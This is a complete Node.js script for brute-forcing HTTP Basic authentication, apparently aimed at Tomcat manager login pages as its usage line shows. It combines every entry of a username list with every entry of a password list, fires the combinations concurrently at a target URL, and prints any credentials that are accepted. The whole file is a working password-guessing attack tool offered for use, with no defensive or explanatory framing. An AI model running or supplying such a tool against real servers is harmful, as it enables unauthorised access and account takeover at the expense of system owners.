var fs = require('fs');
var request = require('request');

var counter = 0;
var totalCount = 0;
var maxThread = 16;
var nowThread = 0;
var authorizationList = [];
var startTime = (new Date()).getTime();
var options = {
    url: null,
    headers: {}
}
var consoleLength = 80;

var consoleLog = function(str, newLine) {
    var ss = [];
    ss[consoleLength - str.length] = '';
    process.stdout.write(str + ss.join(' ') + (newLine ? '\r\n' : '\033[0G'));
}

var readFile = function(fp, cb) {
    fs.readFile(fp, function(err, data) {
        cb(data);
    });
};

var threadFunc = function(Authorization) {
    options.headers.Authorization = Authorization;
    request.get(options, function(err, data) {
        if (data.statusCode != 401) {
            consoleLog(['Good luck: {', data.statusCode, '} ', new Buffer(Authorization.split(' ')[1], 'base64').toString()].join(''), true);
        }
        if (--totalCount === 0) {
            consoleLog('------', true);
            consoleLog(['Cost time: ', ((new Date()).getTime() - startTime) / 1000].join(''), true);
        }
        --nowThread;
    });
}

var callThreadFunc = function() {
    if (nowThread >= maxThread) {
        return setTimeout(callThreadFunc, 8);
    }
    ++nowThread;
    var Authorization = authorizationList.pop();
    if (Authorization !== undefined) {
        threadFunc(Authorization);
        callThreadFunc();
    }
}

var lastCount = function() {
    if (totalCount > 0) {
        consoleLog(['Speed: ', counter - totalCount, 'L/S; ', 'Left: ', totalCount].join(''))
        counter = totalCount;
        setTimeout(lastCount, 1000);
    }
}

var main = function() {
    options.url = process.argv[2];
    var usnameFile = process.argv[3];
    var passwdFile = process.argv[4];
    if (!options.url || !usnameFile || !passwdFile) {
        consoleLog('Usage: node this.js http://127.0.0.1:8080/manager/html usname.txt passwd.txt', true);
        return 1;
    }
    readFile(usnameFile, function(uData) {
        readFile(passwdFile, function(pData) {
            var unameList = uData.toString().split('\r\n');
            var upassList = pData.toString().split('\r\n');
            uData = pData = null;
            counter = totalCount = unameList.length * upassList.length;
            if (totalCount < 1) {
                consoleLog('File of usname or passwd is empty.', true);
                return 1;
            } else {
                consoleLog(['Total count: ', totalCount].join(''), true);
                consoleLog('------', true);
            }
            unameList.forEach(function(u, m) {
                upassList.forEach(function(p, n) {
                    authorizationList.push('Basic ' + new Buffer(u + ':' + p).toString('base64'));
                });
            });
            callThreadFunc();
            lastCount();
        });
    });
}
main();
